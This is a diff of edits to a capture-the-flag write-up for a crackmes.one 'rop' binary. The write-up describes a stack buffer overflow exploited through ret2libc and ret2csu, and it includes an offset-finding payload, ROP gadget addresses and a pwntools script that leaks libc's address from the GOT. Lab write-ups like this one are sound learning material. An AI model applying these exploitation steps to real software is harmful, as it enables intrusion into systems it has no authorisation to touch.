@@ -2,7 +2,7 @@
 This exploit was provided by BitFriends on crackmes.one https://crackmes.one/crackme/5f3d7ed033c5d42a7c667d95
 
 ## Context
-This is very exciting as it's my first time doing any type of buffer overflow myself from scratch. I'd like to thank BitFriends in advance for uploading a binary that serves as a low entry introduction. My I had to learn almost all of it as I only undestood buffer overflows from a theoretical standpoint. Because of this, I decided to include some of my learning process in this write up.
+This is very exciting as it's my first time doing any type of buffer overflow myself from scratch. I'd like to thank BitFriends in advance for uploading a binary that serves as a low entry introduction. I had to learn almost all of it as I only undestood buffer overflows from a theoretical standpoint. Because of this, I decided to include some of my learning process in this write up.
 
 ## Recon
 ```
@@ -21,7 +21,7 @@ This is very exciting as it's my first time doing any type of buffer overflow my
     Stripped:   No
 ```
 
-As the challenge it self is called 'rop' I start out searching "rop exploit" online, and learn it stands for Return Oriented Programming. Supposedly, an attacker using this technique would be able to hijack a programs control flow and execute instructions already present in the machines memory. These instructions are refered to as gadgets. This to me sounds like some type of buffer overflow so let's run it and see if it takes any type of input.
+As the challenge itself is called 'rop' I start out searching "rop exploit" online, and learn it stands for Return Oriented Programming. Supposedly, an attacker using this technique would be able to hijack a programs control flow and execute instructions already present in the machines memory. These instructions are referred to as gadgets. This to me sounds like some type of buffer overflow so let's run it and see if it takes any type of input.
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ ./rop
@@ -92,7 +92,7 @@ This program's logic and it was written with a couple of assumptions during it's
 3. It assumes given input will be completely valid, as it does no input validation whatsoever.
 
 ### Vulnerability Enumeration
-I know that if we want to overflow anything, in theory, we have to give it more bytes of data than it reserved for the input buffer. Local_48 here is the input buffer, which has `0x40` aka 64 bytes. But, the `read()` has `0x280 as it's third argument. In the libc documentation it mentions that that's the maximum input that can be taken. `0x280` to decimal is `(2 * 16^2) + (8 * 16^1)` = 640. So, it takes 640 bytes of maximum input. This seems tailor fit for exploitation!
+I know that if we want to overflow anything, in theory, we have to give it more bytes of data than it reserved for the input buffer. Local_48 here is the input buffer, which has `0x40` aka 64 bytes. But, the `read()` has `0x280` as it's third argument. In the libc documentation it mentions that that's the maximum input that can be taken. `0x280` to decimal is `(2 * 16^2) + (8 * 16^1)` = 640. So, it takes 640 bytes of maximum input. This seems tailor fit for exploitation!
 
 To start exploiting this vulnerability I first need to find the offset of the return adress of the current function. This way we can take over the control flow of the program. The stack should generally look like this:
 ```
@@ -109,7 +109,7 @@ gdb ./rop
 
 (gdb) x/gx $rsp
 ```
-But on this system I run fish shell which doesn't support `<(` So I have to write it do a file first:
+But on this system I run fish shell which doesn't support `<(` So I have to write it to a file first:
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'B'*8)" > /tmp/payload.bin
@@ -127,7 +127,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb) x/gx $rsp
 0x7fffffffdfd8: 0x4242424242424242
 ```
-This proves the suspision to be correct; 72 bytes of A's in paddding and the next 8 B's fall perfectly on the next byte.
+This proves the suspicion to be correct; 72 bytes of A's in padding and the next 8 B's fall perfectly on the next byte.
 
 ## Exploitation
 
@@ -142,10 +142,10 @@ To go for ret2plt `system` and `/bin/sh` have to be present already.
 ~/Projects/RE/crackmes.one/rop
 ❯ objdump -d ./rop | grep -i system
 ```
-No results, so it's likely ret2libc. In order to properly perform ret2libc I need to leak the *runtime* libc address, calculate `system` and `/bin/sh` from it, use those to call the full `system("/bin/sh") to spawn the a shell. To leak the libc address itself we can call `write(1, write_got, 8)` to print the GOT entry of `write()`. This will contain the libc runtime addres *offset* by `write()`. Simply substracting `write()`'s offset will reveal the libc base address. In order to construct this call, it requires setting of three registers: `RDI`, `RSI`, and `RDX`. So let's start off by looking for these. If we can't find proper gadgets for these registers, we'll have to resort to ret2csu, which should be possible since it's non-PIE.
+No results, so it's likely ret2libc. In order to properly perform ret2libc I need to leak the *runtime* libc address, calculate `system` and `/bin/sh` from it, use those to call the full `system("/bin/sh")` to spawn the a shell. To leak the libc address itself we can call `write(1, <write_got>, 8)` to print the GOT entry of `write()`. This will contain the libc runtime addres *offset* by `write()`. Simply subtracting `write()`'s offset will reveal the libc base address. In order to construct this call, it requires setting of three registers: `RDI`, `RSI`, and `RDX`. So let's start off by looking for these. If I can't find proper gadgets for these registers, I'll have to resort to ret2csu, which should be possible since it's non-PIE.
 
 ### Leaking libc
-This program's size 
+First step, to leak the address, is to look for gadgets in the binary that I can do this with.
 
 ```
 ~/Projects/RE/crackmes.one/rop
@@ -155,7 +155,7 @@ This program's size
 0x0000000000400613 : pop rdi ; ret
 0x0000000000400611 : pop rsi ; pop r15 ; ret
 ```
-I have here a `pop rdi ; ret` and `pop rsi ; pop r15 ; ret`, but no `pop rdx` gadget. Earlier I confirmed in GDB that RDX is 0 at the time of the ret, meaning write would print nothing. So ret2csu seems our next best strategy to find our gadgets and leak the libc address. By using `objdump` I can look for `"__libc_csu_init"` and search it for potential gadgets:
+I have here a `pop rdi ; ret` and `pop rsi ; pop r15 ; ret`, but no `pop rdx` gadget. Earlier, I confirmed in GDB that RDX is 0 at the time of the ret, meaning write would print nothing. So ret2csu seems our next best strategy to find our gadgets and leak the libc address. By using `objdump` I can look for `"__libc_csu_init"` and search it for potential gadgets:
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ objdump -d ./rop | grep -A 30 "__libc_csu_init"
@@ -227,7 +227,7 @@ mov    %r14,%rsi
 mov    %r13d,%edi
 call   *(%r12,%rbx,8)
 ```
-To leak the libc address, I set up a python script that to automate the process. Later I will likely need this script for the full exploit.
+To leak the libc address, I set up a python script that to automate the process. After gadget 2's call returns, __libc_csu_init executes another pop sequence before its own ret. That's 7 × 8 = 56 bytes of padding needed to absorb it before the next gadget. For my leak script, I used both gadgets. Gadget 1 at `0x40060a` to load the registers via the pop sequence, and gadget 2 at 0x4005f0 to execute the call. These are the results:
 ```Python
 from pwn import *
 
@@ -263,8 +263,6 @@ p.recvuntil(b'Input: ')   # eat first prompt
 leaked = p.recv(8, timeout=1)
 print(f"Leaked ({len(leaked)} bytes): {leaked.hex()}")
 ```
-After gadget 2's call returns, __libc_csu_init executes another pop sequence before its own ret. That's 7 × 8 = 56 bytes of padding needed to absorb it before the next gadget. 
-For my leak script, I used both gadgets. Gadget 1 at `0x40060a` to load the registers via the pop sequence, and gadget 2 at 0x4005f0 to execute the call. These are the results:
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ python leak.py
@@ -279,13 +277,14 @@ For my leak script, I used both gadgets. Gadget 1 at `0x40060a` to load the regi
 Leaked (8 bytes): e0ddd07f027f0000
 [*] Stopped process './rop' (pid 23912)
 ```
-Now that is the leaked value, but we need to translate these raw bytes to a real usable address. For that I made another little script.
-```
+`e0ddd07f027f0000` is the leaked value, but we need to translate these raw bytes to a real usable address. For that I made another little script.
+```Python
 from pwn import *
 leaked = bytes.fromhex('e0ddd07f027f0000')
 write_libc = u64(leaked)
 print(hex(write_libc))
-
+```
+```
 ~/Projects/RE/crackmes.one/rop
 ❯ python translate_libc.py
 0x7f027fd0dde0
@@ -388,4 +387,4 @@ edoardo
 ```
 
 ## Conclusion
-The goal of this challenge was perform a stack-based buffer overflow attack on this binary and spawn a shell. This I achieved by with ret2libc exploit supplemented with a ret2csu. I think this was a wonderful challenge and I learned a whole lot. Thanks again to BitFriends for uploading this great binary.
+The goal of this challenge was perform a stack-based buffer overflow attack on this binary and spawn a shell. This I achieved with a ret2libc exploit supplemented with a ret2csu. I think this was a wonderful challenge and I learned a whole lot. Thanks again to BitFriends for uploading this great binary.
